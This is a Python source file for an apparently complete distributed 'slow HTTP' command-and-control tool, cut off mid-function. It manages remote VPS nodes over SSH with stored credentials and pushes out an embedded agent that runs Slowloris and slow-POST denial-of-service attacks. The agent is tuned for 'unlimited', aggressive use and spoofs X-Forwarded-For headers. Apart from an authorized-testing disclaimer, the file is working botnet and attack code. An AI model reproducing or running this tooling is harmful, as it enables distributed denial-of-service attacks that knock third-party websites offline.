#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Enhanced Version
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse
import logging
import hashlib
import re
import ipaddress
import select  # Added missing import

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/slowhttp_c2.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SlowHTTP-C2")

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(key_file, 0o600) 
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        """Encrypt password with Fernet encryption"""
        if not password:
            return ""
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        """Decrypt password with error handling"""
        try:
            if not encrypted_password:
                return ""
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception as e:
            logger.error(f"Failed to decrypt password: {str(e)}")
            return ""
    
    def hash_data(self, data):
        """Create a secure hash of data"""
        return hashlib.sha256(data.encode()).hexdigest()
    
    def validate_ip(self, ip):
        """Validate if string is a valid IP address"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """Initialize database with improved schema and error handling"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # VPS nodes table with improved schema
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS vps_nodes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL UNIQUE,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ssh_port INTEGER DEFAULT 22,
                    status TEXT DEFAULT 'offline',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP,
                    location TEXT,
                    capabilities TEXT,
                    last_check_result TEXT,
                    system_info TEXT
                )
            ''')
            
            # Attack sessions table with improved schema
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_name TEXT NOT NULL,
                    target_url TEXT NOT NULL,
                    target_host TEXT,
                    attack_type TEXT NOT NULL,
                    vps_nodes TEXT,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    status TEXT DEFAULT 'pending',
                    parameters TEXT,
                    results TEXT,
                    success_rate REAL,
                    notes TEXT
                )
            ''')
            
            # Attack results table with improved schema
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id INTEGER,
                    vps_ip TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    connections_active INTEGER DEFAULT 0,
                    packets_sent INTEGER DEFAULT 0,
                    status TEXT,
                    cpu_usage REAL,
                    memory_usage REAL,
                    error_count INTEGER DEFAULT 0,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
                )
            ''')
            
            # System logs table for better auditing
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS system_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    event_type TEXT,
                    description TEXT,
                    source_ip TEXT,
                    user_agent TEXT,
                    severity TEXT
                )
            ''')
            
            conn.commit()
            conn.close()
            
            # Set secure permissions
            os.chmod(self.db_file, 0o600)
            logger.info(f"Database initialized: {self.db_file}")
            
        except sqlite3.Error as e:
            logger.error(f"Database initialization error: {str(e)}")
            raise
    
    def execute_query(self, query, params=(), fetch_one=False, fetch_all=False):
        """Execute SQL query with proper error handling and connection management"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute(query, params)
            
            result = None
            if fetch_one:
                result = cursor.fetchone()
            elif fetch_all:
                result = cursor.fetchall()
            else:
                conn.commit()
                result = cursor.lastrowid
                
            return result
        except sqlite3.Error as e:
            if conn:
                conn.rollback()
            logger.error(f"Database error: {str(e)}")
            logger.error(f"Query: {query}")
            logger.error(f"Params: {params}")
            return None
        finally:
            if conn:
                conn.close()
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        """Add VPS to database with input validation"""
        try:
            # Input validation
            if not ip or not username or not encrypted_password:
                return None, "Missing required fields"
            
            # Check if VPS already exists
            existing = self.execute_query(
                "SELECT id FROM vps_nodes WHERE ip_address = ?", 
                (ip,), 
                fetch_one=True
            )
            
            if existing:
                return None, "VPS with this IP already exists"
            
            # Insert new VPS
            vps_id = self.execute_query(
                '''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
                ''', 
                (ip, username, encrypted_password, port, location)
            )
            
            # Log the action
            self.log_system_event("vps_added", f"Added VPS {ip}", ip)
            
            return vps_id, "VPS added successfully"
        except Exception as e:
            logger.error(f"Error adding VPS: {str(e)}")
            return None, f"Error: {str(e)}"
    
    def get_all_vps(self):
        """Get all VPS nodes with error handling"""
        try:
            return self.execute_query(
                'SELECT * FROM vps_nodes ORDER BY id', 
                fetch_all=True
            ) or []
        except Exception as e:
            logger.error(f"Error getting VPS list: {str(e)}")
            return []
    
    def update_vps_status(self, ip, status, check_result=None):
        """Update VPS status with additional info"""
        try:
            query = '''
                UPDATE vps_nodes 
                SET status = ?, last_seen = ?
            '''
            params = [status, datetime.now().isoformat()]
            
            if check_result:
                query += ", last_check_result = ?"
                params.append(check_result)
                
            query += " WHERE ip_address = ?"
            params.append(ip)
            
            self.execute_query(query, tuple(params))
            return True
        except Exception as e:
            logger.error(f"Error updating VPS status: {str(e)}")
            return False
    
    def update_vps_system_info(self, ip, system_info):
        """Update VPS system information"""
        try:
            self.execute_query(
                "UPDATE vps_nodes SET system_info = ? WHERE ip_address = ?",
                (json.dumps(system_info), ip)
            )
            return True
        except Exception as e:
            logger.error(f"Error updating VPS system info: {str(e)}")
            return False
    
    def remove_vps(self, ip):
        """Remove VPS with confirmation and logging"""
        try:
            result = self.execute_query(
                'DELETE FROM vps_nodes WHERE ip_address = ?', 
                (ip,)
            )
            
            if result:
                self.log_system_event("vps_removed", f"Removed VPS {ip}", ip)
                return True
            return False
        except Exception as e:
            logger.error(f"Error removing VPS: {str(e)}")
            return False
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        """Create attack session with improved validation"""
        try:
            # Input validation
            if not session_name or not target_url or not attack_type or not vps_list:
                return None, "Missing required fields"
                
            # Sanitize inputs
            session_name = re.sub(r'[^\w\-_]', '_', session_name)
            
            session_id = self.execute_query(
                '''
                INSERT INTO attack_sessions 
                (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', 
                (
                    session_name, 
                    target_url, 
                    target_host, 
                    attack_type, 
                    json.dumps(vps_list), 
                    json.dumps(parameters), 
                    datetime.now().isoformat(), 
                    'running'
                )
            )
            
            # Log the action
            self.log_system_event(
                "attack_started", 
                f"Started {attack_type} attack on {target_host} using {len(vps_list)} VPS", 
                target_host
            )
            
            return session_id, "Attack session created"
        except Exception as e:
            logger.error(f"Error creating attack session: {str(e)}")
            return None, f"Error: {str(e)}"
    
    def get_attack_sessions(self, limit=20):
        """Get attack sessions with error handling"""
        try:
            return self.execute_query(
                'SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', 
                (limit,), 
                fetch_all=True
            ) or []
        except Exception as e:
            logger.error(f"Error getting attack sessions: {str(e)}")
            return []
    
    def update_attack_status(self, session_id, status, results=None):
        """Update attack session status"""
        try:
            query = "UPDATE attack_sessions SET status = ?"
            params = [status]
            
            if status in ['stopped', 'completed', 'failed']:
                query += ", end_time = ?"
                params.append(datetime.now().isoformat())
            
            if results:
                query += ", results = ?"
                params.append(json.dumps(results))
                
            query += " WHERE id = ?"
            params.append(session_id)
            
            self.execute_query(query, tuple(params))
            return True
        except Exception as e:
            logger.error(f"Error updating attack status: {str(e)}")
            return False
    
    def log_system_event(self, event_type, description, source_ip=None, severity="INFO"):
        """Log system events for auditing"""
        try:
            self.execute_query(
                '''
                INSERT INTO system_logs (event_type, description, source_ip, severity)
                VALUES (?, ?, ?, ?)
                ''',
                (event_type, description, source_ip, severity)
            )
            return True
        except Exception as e:
            logger.error(f"Error logging system event: {str(e)}")
            return False
    
    def record_attack_result(self, session_id, vps_ip, connections, packets, status, cpu=None, memory=None, errors=0):
        """Record attack results with performance metrics"""
        try:
            self.execute_query(
                '''
                INSERT INTO attack_results 
                (session_id, vps_ip, connections_active, packets_sent, status, cpu_usage, memory_usage, error_count)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''',
                (session_id, vps_ip, connections, packets, status, cpu, memory, errors)
            )
            return True
        except Exception as e:
            logger.error(f"Error recording attack result: {str(e)}")
            return False

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}  # Cache VPS credentials
        self.connection_locks = {}  # Thread locks for connection operations
        self.max_retries = 3
        self.retry_delay = 2
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        """Connect to VPS with improved error handling and retry mechanism"""
        # Create a lock for this connection if it doesn't exist
        if ip not in self.connection_locks:
            self.connection_locks[ip] = threading.Lock()
            
        with self.connection_locks[ip]:
            # Check if already connected
            if ip in self.connections and self._check_connection_alive(ip):
                return True, "Already connected"
                
            # Decrypt password
            try:
                password = self.security_manager.decrypt_password(encrypted_password)
                if not password:
                    return False, "Failed to decrypt password"
                
                # Cache credentials for auto-reconnect
                self.connection_cache[ip] = {
                    'username': username,
                    'encrypted_password': encrypted_password,
                    'port': port
                }
                
                # Try to connect with retries
                for attempt in range(self.max_retries):
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
                        # Connect with timeout
                        ssh.connect(
                            hostname=ip,
                            username=username,
                            password=password,
                            port=port,
                            timeout=timeout,
                            allow_agent=False,
                            look_for_keys=False
                        )
                        
                        # Test connection with simple command
                        stdin, stdout, stderr = ssh.exec_command("echo 'Connection test'", timeout=5)
                        exit_status = stdout.channel.recv_exit_status()
                        
                        if exit_status != 0:
                            ssh.close()
                            if attempt < self.max_retries - 1:
                                time.sleep(self.retry_delay)
                                continue
                            return False, "Connection test failed"
                        
                        # Store connection
                        self.connections[ip] = ssh
                        logger.info(f"Connected to VPS: {ip}")
                        return True, "Connected successfully"
                        
                    except Exception as e:
                        if attempt < self.max_retries - 1:
                            logger.warning(f"Connection attempt {attempt+1} failed for {ip}: {str(e)}")
                            time.sleep(self.retry_delay)
                        else:
                            logger.error(f"Failed to connect to {ip} after {self.max_retries} attempts: {str(e)}")
                            return False, str(e)
                            
            except Exception as e:
                logger.error(f"Connection error for {ip}: {str(e)}")
                return False, str(e)
    
    def _check_connection_alive(self, ip):
        """Check if SSH connection is still alive"""
        if ip not in self.connections:
            return False
            
        try:
            transport = self.connections[ip].get_transport()
            if transport is None or not transport.is_active():
                return False
                
            # Test with a simple command
            stdin, stdout, stderr = self.connections[ip].exec_command("echo 'test'", timeout=5)
            exit_status = stdout.channel.recv_exit_status()
            return exit_status == 0
        except Exception:
            return False
    
    def reconnect_vps(self, ip):
        """Attempt to reconnect to VPS using cached credentials"""
        if ip not in self.connection_cache:
            return False, "No cached credentials for this VPS"
        
        # Close existing connection if any
        self.disconnect_vps(ip)
        
        cached = self.connection_cache[ip]
        return self.connect_vps(
            ip, 
            cached['username'], 
            cached['encrypted_password'], 
            cached['port']
        )
    
    def disconnect_vps(self, ip):
        """Disconnect from VPS with proper cleanup"""
        if ip in self.connections:
            try:
                self.connections[ip].close()
                del self.connections[ip]
                logger.info(f"Disconnected from VPS: {ip}")
                return True
            except Exception as e:
                logger.error(f"Error disconnecting from {ip}: {str(e)}")
        return False
    
    def execute_command(self, ip, command, timeout=60, auto_reconnect=True):
        """Execute command with auto-reconnect capability and improved error handling"""
        # Check if connection exists, try to reconnect if not
        if ip not in self.connections or not self._check_connection_alive(ip):
            if auto_reconnect:
                logger.info(f"No active connection to {ip}, attempting reconnect...")
                success, message = self.reconnect_vps(ip)
                if not success:
                    return False, f"Reconnection failed: {message}"
            else:
                return False, "No connection to VPS"
        
        # Use lock to prevent concurrent command execution on the same connection
        with self.connection_locks.get(ip, threading.Lock()):
            try:
                # Execute command with timeout
                stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
                
                # Wait for command completion
                exit_status = stdout.channel.recv_exit_status()
                
                # Get output and error
                output = stdout.read().decode('utf-8', errors='ignore').strip()
                error = stderr.read().decode('utf-8', errors='ignore').strip()
                
                if exit_status == 0:
                    return True, output
                else:
                    error_msg = error if error else f"Command failed with exit status {exit_status}"
                    logger.warning(f"Command failed on {ip}: {error_msg}")
                    return False, error_msg
                    
            except Exception as e:
                logger.error(f"Command execution error on {ip}: {str(e)}")
                
                # Connection might be broken, remove it
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                    del self.connections[ip]
                
                # Try to reconnect and execute again if auto_reconnect is enabled
                if auto_reconnect:
                    logger.info(f"Command failed on {ip}, attempting reconnect and retry...")
                    success, message = self.reconnect_vps(ip)
                    if success:
                        return self.execute_command(ip, command, timeout, auto_reconnect=False)
                    else:
                        return False, f"Reconnection failed: {message}"
                
                return False, str(e)
    
    def get_system_info(self, ip):
        """Get detailed system information from VPS"""
        if not self._check_connection_alive(ip):
            success, message = self.reconnect_vps(ip)
            if not success:
                return {}
        
        system_info = {}
        commands = {
            "os": "cat /etc/os-release | grep PRETTY_NAME | cut -d '&quot;' -f 2",
            "kernel": "uname -r",
            "cpu": "cat /proc/cpuinfo | grep 'model name' | head -1 | cut -d ':' -f 2",
            "cpu_cores": "nproc",
            "memory": "free -m | grep Mem | awk '{print $2}'",
            "disk": "df -h / | tail -1 | awk '{print $2}'",
            "python_version": "python3 --version 2>&1 || python --version 2>&1"
        }
        
        for key, cmd in commands.items():
            success, output = self.execute_command(ip, cmd, timeout=10)
            if success:
                system_info[key] = output.strip()
            else:
                system_info[key] = "Unknown"
        
        return system_info
    
    def deploy_agent(self, ip):
        """Deploy unlimited slow HTTP attack agent to VPS with improved security and error handling"""
        
        # Complete unlimited agent script
        agent_script = '''#!/usr/bin/env python3
import socket,threading,time,sys,random,string,signal,argparse,os,logging
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='/tmp/slowhttp_agent.log',
    filemode='a'
)
logger = logging.getLogger("SlowHTTP-Agent")

class SlowHTTPAttack:
    def __init__(self,host,port=80):
        self.host,self.port,self.conns,self.running=host,port,[],False
        self.stats={'sent':0,'errors':0,'active':0,'bytes_sent':0}
        self.lock = threading.Lock()
        self.start_time = time.time()
    
    def create_socket(self):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((self.host,self.port))
            return s
        except Exception as e:
            with self.lock:
                self.stats['errors']+=1
            return None
    
    def slowloris_attack(self,num_conns=100,delay=15,duration=0):
        logger.info(f"Starting Slowloris attack on {self.host}:{self.port}")
        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        self.start_time=time.time()
        
        # UNLIMITED: Aggressive connection creation - no artificial limits
        logger.info("Creating initial connections...")
        for i in range(num_conns):
            if not self.running:
                break
            
            sock=self.create_socket()
            if sock:
                try:
                    # Full HTTP request with multiple headers for maximum server load
                    request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\\r\\n"
                    request += f"Host: {self.host}\\r\\n"
                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    request += "Pragma: no-cache\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Upgrade-Insecure-Requests: 1\\r\\n"
                    
                    # Convert escape sequences to actual bytes
                    request_bytes = request.encode().decode('unicode_escape').encode()
                    
                    sock.send(request_bytes)
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent']+=1
                        self.stats['bytes_sent'] += len(request_bytes)
                    
                    if (i+1) % 100 == 0:
                        logger.info(f"{i+1}/{num_conns} connections created")
                        
                except Exception as e:
                    with self.lock:
                        self.stats['errors']+=1
                    try:
                        sock.close()
                    except:
                        pass
            
            # MINIMAL DELAY - Maximum connection rate
            if i % 100 == 0:
                time.sleep(0.01)  # Very small delay only every 100 connections
        
        with self.lock:
            self.stats['active']=len(self.conns)
        logger.info(f"Initial connections complete. Active: {len(self.conns)}")
        
        if not self.conns:
            logger.error("No connections established, aborting attack")
            return
        
        # Keep connections alive phase - AGGRESSIVE MODE
        logger.info("Starting aggressive keep-alive phase...")
        cycle_count=0
        
        while self.running and self.conns:
            # Check duration limit
            if duration > 0 and (time.time() - self.start_time) >= duration:
                logger.info("Time limit reached, stopping attack...")
                break
            
            cycle_count+=1
            active_before=len(self.conns)
            
            # Send multiple headers per connection for maximum server load
            failed_socks = []
            headers_per_cycle = random.randint(2, 5)  # Multiple headers per cycle
            
            for sock in self.conns:
                try:
                    # Send multiple headers to increase server load
                    for _ in range(headers_per_cycle):
                        header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10,20)))
                        header_value=''.join(random.choice(string.ascii_letters+string.digits+'-_.') for _ in range(random.randint(20,50)))
                        header = f"X-{header_name}: {header_value}\\r\\n"
                        header_bytes = header.encode().decode('unicode_escape').encode()
                        
                        sock.send(header_bytes)
                        with self.lock:
                            self.stats['sent']+=1
                            self.stats['bytes_sent'] += len(header_bytes)
                    
                except Exception:
                    failed_socks.append(sock)
                    with self.lock:
                        self.stats['errors']+=1
            
            # Aggressive connection replacement - maintain connection count
            for sock in failed_socks:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                
                # AGGRESSIVE: Always try to replace lost connections
                replacement_attempts = 3  # Multiple attempts per failed connection
                for attempt in range(replacement_attempts):
                    new_sock=self.create_socket()
                    if new_sock:
                        try:
                            # Full request with randomization
                            req = f"GET /?session={random.randint(100000,999999)}&attempt={attempt} HTTP/1.1\\r\\n"
                            req += f"Host: {self.host}\\r\\n"
                            req += f"User-Agent: SlowHTTP-Agent-{random.randint(1000,9999)}\\r\\n"
                            req += "Connection: keep-alive\\r\\n"
                            req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n"
                            req_bytes = req.encode().decode('unicode_escape').encode()
                            
                            new_sock.send(req_bytes)
                            self.conns.append(new_sock)
                            with self.lock:
                                self.stats['sent']+=1
                                self.stats['bytes_sent'] += len(req_bytes)
                            break  # Success, stop attempting
                        except Exception:
                            try:
                                new_sock.close()
                            except:
                                pass
            
            with self.lock:
                self.stats['active']=len(self.conns)
                active_after=len(self.conns)
                sent = self.stats['sent']
                errors = self.stats['errors']
                bytes_sent = self.stats['bytes_sent']
            
            # Calculate and log metrics
            elapsed = time.time() - self.start_time
            mb_sent = bytes_sent / (1024 * 1024)
            
            logger.info(f"Cycle {cycle_count} | Active: {active_after} | Headers: {sent} | Errors: {errors} | Data: {mb_sent:.2f} MB | Uptime: {int(elapsed)}s")
            
            # Write status file for monitoring
            self.write_status_file()
            
            # VARIABLE DELAY for unpredictability
            sleep_time = random.uniform(delay * 0.5, delay * 1.5)
            time.sleep(sleep_time)
    
    def slow_post_attack(self,num_conns=50,delay=10,duration=0):
        logger.info(f"Starting Slow POST attack on {self.host}:{self.port}")
        logger.info(f"Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        self.start_time=time.time()
        
        def post_worker(worker_id):
            sock=self.create_socket()
            if not sock:
                logger.warning(f"Worker {worker_id}: Failed to connect")
                return
            
            try:
                # UNLIMITED: Large content-length for maximum effectiveness
                content_length=random.randint(10000000,100000000)  # 10MB to 100MB range
                
                # Proper HTTP POST format
                post_request = f"POST /form{worker_id}?data=large HTTP/1.1\\r\\n"
                post_request += f"Host: {self.host}\\r\\n"
                post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                post_request += f"Content-Length: {content_length}\\r\\n"
                post_request += "Connection: keep-alive\\r\\n"
                post_request += "Expect: 100-continue\\r\\n"  # Forces server to wait
                post_request += "\\r\\n"  # End of headers
                
                # Convert escape sequences properly
                post_bytes = post_request.encode().decode('unicode_escape').encode()
                
                sock.send(post_bytes)
                with self.lock:
                    self.stats['sent']+=1
                    self.stats['bytes_sent'] += len(post_bytes)
                    
                logger.info(f"Worker {worker_id}: POST headers sent, content-length: {content_length:,} bytes")
                
                # Send POST data extremely slowly - no artificial limits
                bytes_sent=0
                chunk_sizes=[1,2,3,4,5,6,7,8,9,10,15,20]  # Variable chunk sizes
                
                while self.running and bytes_sent < content_length:
                    # Check duration limit
                    if duration > 0 and (time.time() - self.start_time) >= duration:
                        logger.info(f"Worker {worker_id}: Duration limit reached")
                        break
                    
                    # Variable chunk size for unpredictability
                    chunk_size = random.choice(chunk_sizes)
                    remaining = min(chunk_size, content_length - bytes_sent)
                    
                    # Generate data chunk
                    data=''.join(random.choice(string.ascii_letters+string.digits+'=&') for _ in range(remaining))
                    
                    try:
                        sock.send(data.encode())
                        bytes_sent += remaining
                        with self.lock:
                            self.stats['sent'] += remaining
                            self.stats['bytes_sent'] += remaining
                    except Exception:
                        logger.warning(f"Worker {worker_id}: Connection lost at {bytes_sent:,} bytes")
                        break
                    
                    # Progress report every 1MB
                    if bytes_sent % 1000000 == 0:
                        progress = (bytes_sent/content_length)*100
                        logger.info(f"Worker {worker_id}: Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                        
                        # Update status file
                        self.write_status_file()
                    
                    # SLOW TRANSMISSION - The core of R.U.D.Y
                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)  # Variable delay
                    time.sleep(sleep_time)
                
                logger.info(f"Worker {worker_id}: Completed: {bytes_sent:,} bytes sent")
                
            except Exception as e:
                logger.error(f"Worker {worker_id}: Error: {str(e)}")
                with self.lock:
                    self.stats['errors']+=1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # NO THREAD LIMITS - Use all requested connections
        threads=[]
        logger.info(f"Starting {num_conns} R.U.D.Y worker threads...")
        
        # Start all worker threads
        for i in range(num_conns):
            if not self.running:
                break
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            logger.info(f"Thread {i+1}: Worker started")
            time.sleep(0.1)  # Small stagger to avoid overwhelming
        
        # Monitor all threads
        while self.running:
            if duration > 0 and (time.time() - self.start_time) >= duration:
                logger.info("Duration limit reached, stopping...")
                self.running = False
                break
            
            # Count active threads
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                errors = self.stats['errors']
                bytes_sent = self.stats['bytes_sent']
            
            # Calculate metrics
            elapsed = time.time() - self.start_time
            mb_sent = bytes_sent / (1024 * 1024)
            
            logger.info(f"R.U.D.Y STATUS: Active workers: {active_threads}/{num_conns} | Data sent: {mb_sent:.2f} MB | Errors: {errors} | Uptime: {int(elapsed)}s")
            
            # Write status file
            self.write_status_file()
            
            if active_threads == 0:
                logger.info("All workers completed")
                break
            
            time.sleep(10)  # Status update interval
    
    def write_status_file(self):
        """Write status to file for monitoring"""
        try:
            status_dir = "/tmp/slowhttp_c2"
            os.makedirs(status_dir, exist_ok=True)
            
            with self.lock:
                status = {
                    'active': self.stats['active'],
                    'sent': self.stats['sent'],
                    'errors': self.stats['errors'],
                    'bytes_sent': self.stats['bytes_sent'],
                    'uptime': int(time.time() - self.start_time),
                    'timestamp': time.time()
                }
            
            with open(f"{status_dir}/status.json", 'w') as f:
                import json
                json.dump(status, f)
        except Exception as e:
            logger.error(f"Failed to write status file: {str(e)}")
    
    def stop_attack(self):
        logger.info("Stopping attack...")
        self.running=False
        
        # Close all connections
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()
        logger.info("Attack stopped")

# Better signal handling
attacker = None

def signal_handler(sig,frame):
    global attacker
    logger.info("Received interrupt signal")
    if attacker:
        attacker.stop_attack()
    logger.info("Shutting down...")
    sys.exit(0)

def main():
    global attacker
    
    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent - ENHANCED EDITION')
    parser.add_argument('target',help='Target URL or hostname')
    parser.add_argument('attack_type',choices=['slowloris','slow_post'],help='Type of attack to perform')
    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100, no upper limit)')
    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15, can be 0)')
    parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
    
    args=parser.parse_args()
    
    # Validate arguments - REMOVED ARTIFICIAL LIMITS
    if args.connections < 1:
        logger.error("Connections must be at least 1")
        sys.exit(1)
    
    if args.delay < 0:
        logger.error("Delay cannot be negative")
        sys.exit(1)
    
    # Warning for very high connection counts
    if args.connections > 10000:
        logger.warning(f"Very high connection count ({args.connections:,})")
        logger.warning("This may overwhelm your system or network.")
    
    # Parse target
    if args.target.startswith('http://') or args.target.startswith('https://'):
        parsed=urlparse(args.target)
        target_host=parsed.hostname
        target_port=parsed.port or (443 if parsed.scheme=='https' else 80)
    else:
        target_host=args.target.split(':')[0]
        if ':' in args.target:
            try:
                target_port = int(args.target.split(':')[1])
            except ValueError:
                target_port = 80
        else:
            target_port=80
    
    logger.info("=" * 60)
    logger.info("SLOW HTTP ATTACK AGENT - ENHANCED EDITION")
    logger.info("=" * 60)
    logger.info(f"Target: {target_host}:{target_port}")
    logger.info(f"Attack: {args.attack_type.upper()}")
    logger.info(f"Connections: {args.connections:,}")
    logger.info(f"Delay: {args.delay}s")
    logger.info(f"Duration: {'Unlimited' if args.duration==0 else f'{args.duration}s'}")
    logger.info("=" * 60)
    logger.info("WARNING: FOR AUTHORIZED TESTING ONLY!")
    logger.info("=" * 60)
    
    # Set up signal handlers
    signal.signal(signal.SIGINT,signal_handler)
    signal.signal(signal.SIGTERM,signal_handler)
    
    # Create attacker instance
    attacker=SlowHTTPAttack(target_host,target_port)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections,args.delay,args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections,args.delay,args.duration)
    except KeyboardInterrupt:
        logger.info("Interrupted, stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        attacker.stop_attack()
    finally:
        logger.info("Attack completed")

if __name__ == "__main__":
    main()
'''
        
        # Use proper file transfer method
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            "rm -f /tmp/slowhttp_c2/agent.py"  # Clean old version
        ]
        
        # Execute setup commands
        for cmd in commands:
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Setup failed: {output}"
        
        # Transfer file using SFTP instead of base64 encoding
        try:
            if ip in self.connections:
                sftp = self.connections[ip].open_sftp()
                
                # Write agent script to temporary local file
                temp_file = f"/tmp/agent_{ip.replace('.','_')}.py"
                with open(temp_file, 'w') as f:
                    f.write(agent_script)
                
                # Upload via SFTP
                sftp.put(temp_file, '/tmp/slowhttp_c2/agent.py')
                sftp.close()
                
                # Clean up local temp file
                os.remove(temp_file)
                
                logger.info(f"Agent deployed to {ip} via SFTP")
            else:
                logger.warning(f"No SSH connection available for {ip}, using base64 fallback")
                # Fallback to base64 method if SFTP fails
                encoded_script = base64.b64encode(agent_script.encode()).decode()
                cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
                success, output = self.execute_command(ip, cmd)
                if not success:
                    return False, f"File transfer failed: {output}"
        
        except Exception as e:
            logger.error(f"SFTP transfer failed for {ip}: {str(e)}")
            # Fallback to base64 method if SFTP fails
            encoded_script = base64.b64encode(agent_script.encode()).decode()
            cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"File transfer failed: {output}"
        
